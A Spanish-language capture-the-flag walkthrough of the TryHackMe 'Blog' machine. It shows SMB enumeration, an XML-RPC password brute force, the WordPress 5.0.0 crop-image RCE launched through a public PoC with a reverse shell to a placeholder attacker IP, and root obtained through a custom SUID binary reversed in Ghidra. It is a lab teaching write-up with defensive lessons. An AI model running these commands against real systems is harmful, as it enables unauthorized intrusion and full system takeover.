Blog es una máquina Linux Medium de TryHackMe con temática del blog de IT de Billy Joel. La puerta de entrada es un sitio **WordPress 5.0.0** — una versión fijada a propósito por el plugin *wp-downgrade* para que siga siendo vulnerable al **RCE de crop-image** (**CVE-2019-8942** + **CVE-2019-8943**). Tras fuerza-brutear la contraseña de un autor por XML-RPC, esa cadena da una shell como `www-data`. El paso a root es la parte interesante y la razón de ser de este writeup: un binario SUID a medida, `/usr/sbin/checker`, que sacamos de la máquina y **analizamos con ingeniería inversa en Ghidra** para descubrir que entrega una shell de root a cualquiera que ponga una simple variable de entorno.

## Reconocimiento y Enumeración

### Escaneo de Puertos

Un escaneo TCP completo con detección de servicios y scripts por defecto. `-p-` cubre los 65.535 puertos, `-sCV` lanza los scripts NSE por defecto más la detección de versiones, y `-Pn` salta el descubrimiento de host ya que la máquina respondió al ping.

```bash
sudo nmap -p- -sCV -Pn -n 10.128.176.76 -oN nmap
```

```bash
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
|_http-title: Billy Joel's IT Blog – The IT blog
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux
```

Cuatro servicios: SSH, un **WordPress 5.0** servido por Apache, y **Samba** en 139/445. Los scripts de nmap también reportan el nombre de equipo **BLOG** y que SMB permite una cuenta `guest` — merece un vistazo antes de meternos con WordPress.

### Recursos SMB — BillySMB

El signing de SMB está deshabilitado y se acepta una sesión nula, así que podemos listar los recursos de forma anónima:

```bash
smbclient -L 10.128.176.76 -N
```

```bash
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
BillySMB        Disk      Billy's local SMB Share
IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
```

`BillySMB` es legible sin credenciales. Contiene tres ficheros multimedia:

```bash
smbclient \\\\10.128.176.76\\BillySMB -N
```

```bash
smb: \> ls
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 20:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 20:13:45 2020
  check-this.png                      N     3082  Tue May 26 20:13:43 2020
```

Esto es un **rabbit hole** (madriguera). Descargar los tres y pasarlos por `exiftool` (y los chequeos de esteganografía habituales) no saca nada útil — ni credenciales embebidas, ni cadenas ocultas. Es una distracción deliberada; el camino real es la aplicación web. Anotarlo y seguir es lo correcto.

### El Virtual Host blog.thm

Navegar al sitio por IP renderiza una página rota y sin estilos — una señal clásica de que el servidor espera ser accedido por un hostname que usa para construir las URLs de los recursos:

![El blog de Billy Joel cargado por IP, sin estilos porque su CSS apunta a blog.thm](/assets/img/THM/Blog/cap1.png)

Mirar el código fuente de la página lo confirma: cada URL de recurso y de feed apunta a **`blog.thm`**.

```html
<link rel="alternate" type="application/rss+xml" title="... Feed" href="http://blog.thm/feed/" />
<link rel="dns-prefetch" href="//blog.thm" />
```

Añadiendo ese hostname a `/etc/hosts` el sitio resuelve a la máquina, y ahora la hoja de estilos y los recursos cargan correctamente:

```bash
echo "10.128.176.76 blog.thm" | sudo tee -a /etc/hosts
```

![El blog renderizando correctamente tras añadir blog.thm a /etc/hosts](/assets/img/THM/Blog/cap2.png)

Las entradas del blog nombran a dos usuarios probables — **Karen Wheeler** y **Billy Joel** — y una entrada ("A Note From Mom") incluso sugiere que el autor fue despedido hace poco y reutilizaba contraseñas personales. Los scripts de nmap también habían marcado un `robots.txt`:

```bash
curl http://10.128.176.76/robots.txt
```

```bash
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
```

Nada secreto ahí — solo la ruta estándar de administración de WordPress.

### WordPress: whatweb y wpscan

`whatweb` confirma el stack antes de la enumeración más pesada:

```bash
whatweb http://10.128.176.76
# WordPress 5.0, Apache/2.4.29 (Ubuntu)
```

Luego `wpscan` con `-e` (enumerar) hace fingerprint del tema, los plugins y los usuarios contra el vhost:

```bash
wpscan --url http://blog.thm/ -e
```

Tres hallazgos importan:

- **Tema: `twentytwenty`** — el tema activo, en cuyo directorio escribirá su payload el RCE de crop-image.
- **Plugin: `wp-downgrade`** — esta es la pista. `wp-downgrade` permite a un admin fijar WordPress en una versión más antigua, que es exactamente por lo que una máquina en 2026 sigue corriendo la ya parcheada **5.0.0**: fue degradada a propósito para seguir siendo explotable.
- **Usuarios: `kwheel` y `bjoel`** — los nombres de login detrás de Karen Wheeler y Billy Joel.

```bash
[+] kwheel   | Found By: Author Posts - Author Pattern (Passive Detection)
[+] bjoel    | Found By: Author Posts - Author Pattern (Passive Detection)
```

### Ataque de Contraseñas por XML-RPC

Con dos nombres de usuario válidos, `wpscan` puede fuerza-brutear sus contraseñas. Apunta por defecto al endpoint **XML-RPC** de WordPress (`/xmlrpc.php`), que acepta intentos de login sin el rate-limiting ni los CAPTCHAs del formulario web — lo que lo hace mucho más rápido que `wp-login.php`:

```bash
wpscan --url http://blog.thm/ -U users.txt -P /usr/share/wordlists/rockyou.txt
```

```bash
[+] Performing password attack on Xmlrpc against 2 user/s
[SUCCESS] - kwheel / cutiepie1
```

Así que tenemos **`kwheel : cutiepie1`**. Esas credenciales no funcionan por SSH (no es una usuaria de Linux), pero entran directas en WordPress:

![Logueándonos en wp-login.php como kwheel](/assets/img/THM/Blog/cap3.png)

## Acceso Inicial — CVE-2019-8942 y CVE-2019-8943 (RCE de Crop-Image de WordPress 5.0.0) como `www-data`

WordPress 5.0.0 es vulnerable a una conocida **cadena de ejecución remota de código** que solo necesita una cuenta de nivel *Author* — que `kwheel` tiene. Combina dos bugs:

- **CVE-2019-8942** — una subida de ficheros arbitraria autenticada. El post-meta `_wp_attached_file` que registra la ruta de una imagen se puede sobrescribir, así que un atacante puede controlar dónde cree WordPress que vive un fichero subido.
- **CVE-2019-8943** — un path traversal en la acción `crop-image`. Al recortar esa imagen, WordPress escribe la copia recortada en una ruta controlada por el atacante *fuera* del directorio de subidas — por ejemplo en la carpeta del tema activo.

Encadenados: subir una imagen con PHP embebido en sus metadatos, apuntar su ruta al directorio del tema Twenty Twenty mediante el traversal, recortarla para que caiga ahí como un fichero incluible, y luego pedirla para ejecutar el PHP. El resultado es ejecución de código como el usuario del servidor web.

Un PoC público ([ret2x/poc-wordpress-5.0.0](https://github.com/ret2x/poc-wordpress-5.0.0)) automatiza cada paso — autenticar, subir, poner el meta, recortar dentro del tema, crear una entrada que lo incluya, y disparar una reverse shell. (El `exploit/multi/http/wp_crop_rce` de Metasploit hace lo mismo si prefieres el framework.)

```bash
python3 poc.py --url http://blog.thm -u kwheel -p cutiepie1 -lhost <ATTACKER_IP> -lport 4444
```

```bash
[+] Login successful
[+] Image uploaded
[*] Including image into theme
[*] Starting listener on 4444
[*] Executing reverse shell
```

El listener recibe la shell como `www-data`:

```bash
nc -nlvp 4444
```

```bash
Connection received on 10.128.176.76 46174
www-data@blog:/var/www/wordpress$
```

### TTY y Enumeración Local

Tras el habitual tratamiento de la TTY (`python3 -c 'import pty; pty.spawn("/bin/bash")'`, luego `stty raw -echo`), un vistazo alrededor saca dos callejones sin salida más que conviene anotar para no perder tiempo en ellos:

```bash
www-data@blog:/var/www/wordpress$ cat wp-config.php
define('DB_NAME', 'blog');
define('DB_USER', 'wordpressuser');
define('DB_PASSWORD', 'LittleYellowLamp90!@');
```

Esas credenciales de base de datos solo llegan a la instancia local de MySQL — no hay nada en ella que nos haga avanzar, y la contraseña no está reutilizada para un usuario de shell. Y el `user.txt` de Billy es un troleo:

```bash
www-data@blog:/home/bjoel$ cat user.txt
You won't find what you're looking for here.

TRY HARDER
```

Las flags reales vienen después. Lo que *sí* importa es un binario SUID inusual encontrado al cazar vectores de escalada de privilegios:

```bash
www-data@blog:/var/www/wordpress$ find / -perm -4000 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
...
/usr/sbin/checker
```

Todo en esa lista es un binario SUID estándar excepto **`/usr/sbin/checker`** — un ejecutable a medida, no estándar, corriendo con el bit SUID. Ese es el camino de escalada.

## Escalada de Privilegios — `www-data` → `root` (Binario SUID `checker`)

### Encontrar y Exfiltrar el Binario

Ejecutar `checker` sin contexto solo imprime `Not an Admin` y sale — por sí solo no ayuda. Como es un binario compilado, la forma más rápida de entenderlo es traerlo a nuestra máquina y decompilarlo. Servimos el fichero desde la máquina con el servidor web de Python y lo cogemos con `curl`:

```bash
# en el objetivo
www-data@blog:/tmp$ cp /usr/sbin/checker . && python3 -m http.server 8000
```

```bash
# en nuestra máquina
curl -s http://10.128.176.76:8000/checker -o checker
```

### Instalar y Configurar Ghidra

[Ghidra](https://ghidra-sre.org/) es la suite de ingeniería inversa de código abierto de la NSA. Su función estrella es un **decompilador** que convierte un binario nativo de vuelta en pseudocódigo legible estilo C — exactamente lo que necesitamos para ver qué hace `checker`. Como voy a volver a esto, aquí está la configuración inicial completa.

**Descarga.** Coge la última release en ZIP de la página oficial de releases, [github.com/NationalSecurityAgency/ghidra/releases](https://github.com/NationalSecurityAgency/ghidra/releases). Ghidra se distribuye como un archivo autocontenido — no hay instalación a nivel de sistema — pero requiere un **JDK** (OpenJDK) compatible. Cada release indica la versión exacta de Java que necesita en sus notas y en el [README](https://github.com/NationalSecurityAgency/ghidra) del proyecto; descarga también ese JDK si no lo tienes ya.

**Descomprimir y arrancar.** Descomprime la release y ejecuta el script de arranque desde dentro de la carpeta extraída:

```bash
unzip ghidra_*_PUBLIC_*.zip
cd ghidra_*_PUBLIC
./ghidraRun
```

Si Ghidra no encuentra Java al arrancar, apúntalo a tu JDK exportando `JAVA_HOME=/ruta/al/jdk` (o fijando la ruta en `support/launch.properties`).

**Crear un proyecto.** En el primer arranque Ghidra muestra *NO ACTIVE PROJECT*. Crea uno con **File → New Project** (Ctrl+N), elige **Non-Shared Project**, y dale un nombre y una ubicación en disco.

![El menú File de Ghidra con New Project seleccionado](/assets/img/THM/Blog/cap4.png)

Un "proyecto" de Ghidra es simplemente un espacio de trabajo que contiene los binarios que estás analizando. La herramienta que realmente los abre es el **CodeBrowser** — el icono del dragón en el *Tool Chest*.

![El nuevo proyecto de Ghidra con la herramienta CodeBrowser en el Tool Chest](/assets/img/THM/Blog/cap5.png)

**Importar el binario.** Abre el CodeBrowser, luego usa **File → Import File** (atajo `I`) y selecciona el fichero `checker` que exfiltramos.

![Importando un fichero en el CodeBrowser de Ghidra](/assets/img/THM/Blog/cap6.png)

Ghidra auto-detecta el formato. Para `checker` identifica correctamente un **ELF**, lenguaje `x86:LE:64:default:gcc` (un binario x86 de 64 bits little-endian compilado con gcc), así que los valores por defecto son correctos — pulsa **OK**.

![El diálogo de importación mostrando checker detectado como un ELF de 64 bits](/assets/img/THM/Blog/cap7.png)

**Analizar.** Ghidra pregunta si quieres analizar el fichero recién importado — pulsa **Yes**.

![Ghidra preguntando si analizar el binario checker importado](/assets/img/THM/Blog/cap8.png)

El diálogo *Analysis Options* lista todos los analizadores que Ghidra puede ejecutar. Para un binario pequeño como este los **Standard Defaults** son justo lo que queremos, así que deja los checkboxes como están y pulsa **Analyze**.

![Las opciones de análisis de Ghidra en sus valores por defecto](/assets/img/THM/Blog/cap9.png)

### Decompilar main()

Cuando termina el análisis, navegamos a la lógica de entrada a través del **Symbol Tree** de la izquierda: despliega **Functions** y pulsa **main**. La ventana **Decompile** de la derecha renderiza su pseudocódigo en C.

![El Symbol Tree, el listing y el decompilador de Ghidra mostrando la función main de checker](/assets/img/THM/Blog/cap10.png)

```c
undefined8 main(void)
{
  char *pcVar1;

  pcVar1 = getenv("admin");
  if (pcVar1 == (char *)0x0) {
    puts("Not an Admin");
  }
  else {
    setuid(0);
    system("/bin/bash");
  }
  return 0;
}
```

La lógica es trivial una vez es legible:

1. `checker` es propiedad de root y lleva el bit SUID, así que corre con los privilegios efectivos de root.
2. Lee la variable de entorno **`admin`** con `getenv`.
3. Si esa variable está **sin definir** (`NULL`), imprime `Not an Admin` y termina — que es todo lo que vimos antes.
4. Si la variable está **puesta a cualquier cosa**, llama a `setuid(0)` — que tiene éxito precisamente porque el binario es SUID root — y luego lanza `/bin/bash`, dando una shell que ahora corre como root.

El "check" no es una comprobación de autorización real; se satisface simplemente definiendo la variable.

### Conseguir root

```bash
www-data@blog:/tmp$ export admin=anything
www-data@blog:/tmp$ /usr/sbin/checker
root@blog:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

Ya como root podemos leer ambas flags. El home de Billy guarda el `user.txt` *real* (el anterior era un señuelo), y hay una segunda copia escondida en un USB montado:

```bash
root@blog:~# cat /root/root.txt
REDACTED
root@blog:~# cat /media/usb/user.txt
REDACTED
```

## Conclusiones Clave

- **Un plugin de downgrade es una vulnerabilidad con lazo.** `wp-downgrade` fue la razón por la que un host de 2026 seguía corriendo WordPress 5.0.0. Fijar software en una versión deliberadamente antigua para conservar una funcionalidad (o un CTF) reabre todos los bugs corregidos desde entonces — aquí, una cadena de RCE completa. La gestión de versiones es un control de seguridad, no solo mantenimiento.
- **XML-RPC es el punto blando de los logins de WordPress.** El ataque de contraseñas tuvo éxito contra `/xmlrpc.php`, que responde a los intentos de login de forma silenciosa y rápida sin nada del throttling del formulario web. Si no lo usas, desactívalo; si lo usas, limítalo por tasa.
- **Reconoce los rabbit holes pronto.** Los ficheros multimedia de `BillySMB`, la contraseña de base de datos de `wp-config.php` y el `user.txt` falso eran todos callejones sin salida. Parte de trabajar una máquina Medium con eficiencia es anotar una pista, darle una pasada honesta y seguir, en vez de forzarla.
- **SUID + un check débil = root instantáneo.** `checker` nunca necesitó un exploit — solo leer su lógica en Ghidra mostró que la puerta "admin" estaba a un único `getenv` de `setuid(0); system("/bin/bash")`. Cualquier binario SUID-root a medida es un objetivo de alto valor, y un decompilador convierte el "¿qué hace esto?" en una respuesta de dos minutos.
- **La decompilación es una habilidad fundamental, no un último recurso.** Sacar un binario desconocido de la máquina y abrirlo en Ghidra es un flujo repetible: importar, aceptar el análisis por defecto, leer `main`. Estar cómodo con ello hace que un binario raro sea una oportunidad en vez de un muro.
